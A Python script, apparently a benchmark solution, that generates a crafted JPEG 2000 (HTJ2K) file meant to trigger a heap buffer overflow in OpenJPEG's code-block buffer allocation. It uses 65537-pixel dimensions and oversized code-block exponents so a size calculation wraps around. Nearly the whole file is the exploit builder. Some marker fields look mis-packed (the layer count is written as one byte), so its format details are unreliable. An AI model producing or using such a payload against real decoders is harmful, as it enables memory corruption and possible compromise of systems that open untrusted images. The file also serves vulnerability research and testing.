import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Targeting Heap Buffer Overflow in opj_t1_allocate_buffers (HT_DEC).
        Strategy:
        1. Create a J2K codestream with HTJ2K capability (Rsiz=0x4000).
        2. Set Image and Tile dimensions to 65537 (0x10001).
        3. Set Code Block size in COD to cover the whole tile (exponent 15 -> 2^17).
        4. This results in a code block of size 65537x65537.
        5. In vulnerable versions, w*h (65537*65537) overflows 32-bit integer, wrapping to ~131KB.
        6. The allocator allocates a small buffer, but the decoder writes out of bounds.
        """
        
        SOC = b'\xff\x4f'
        
        # SIZ Marker
        # Rsiz = 0x4000 (HTJ2K)
        # Dimensions: 65537 triggers the integer overflow when squared (0x10001^2 = 0x100020001 -> 0x20001)
        width = 65537
        height = 65537
        tile_w = 65537
        tile_h = 65537
        
        # Rsiz(2), Xsiz(4), Ysiz(4), XOsiz(4), YOsiz(4), XTsiz(4), YTsiz(4), XTOsiz(4), YTOsiz(4), Csiz(2)
        siz_params = [
            0x4000, 
            width, height, 
            0, 0, 
            tile_w, tile_h, 
            0, 0, 
            1
        ]
        siz_body = struct.pack('>HIIIIIIIIH', *siz_params)
        # Component: 7 (8-bit), 1, 1 (subsampling)
        siz_comp = struct.pack('>BBB', 7, 1, 1)
        
        SIZ = b'\xff\x51' + struct.pack('>H', len(siz_body) + len(siz_comp) + 2) + siz_body + siz_comp
        
        # COD Marker
        # Scod(1), SGcod(4), SPcod(5)
        # Set code block size exponents to 15 (value+2 = 17 => 2^17 = 131072)
        # This ensures the code block size is clamped to the tile size (65537) rather than restricted to small values.
        xcblk = 15
        ycblk = 15
        
        cod_params = [
            0, # Scod
            0, # Prog order
            1, # Layers
            0, # MCT
            0, # Decomp levels (0 to keep 1 tile-sized resolution)
            xcblk,
            ycblk,
            0, # Mode
            0  # Transform
        ]
        cod_body = struct.pack('>BBBBBBBBB', *cod_params)
        COD = b'\xff\x52' + struct.pack('>H', len(cod_body) + 2) + cod_body
        
        # QCD Marker
        # Minimal Quantization Default
        qcd_body = b'\x00' + b'\x00' * 4
        QCD = b'\xff\x5c' + struct.pack('>H', len(qcd_body) + 2) + qcd_body
        
        # SOD Marker
        SOD = b'\xff\x93'
        
        # Payload: Dummy data to simulate bitstream and trigger parsing
        payload = b'\x00' * 1024
        
        EOC = b'\xff\xd9'
        
        return SOC + SIZ + COD + QCD + SOD + payload + EOC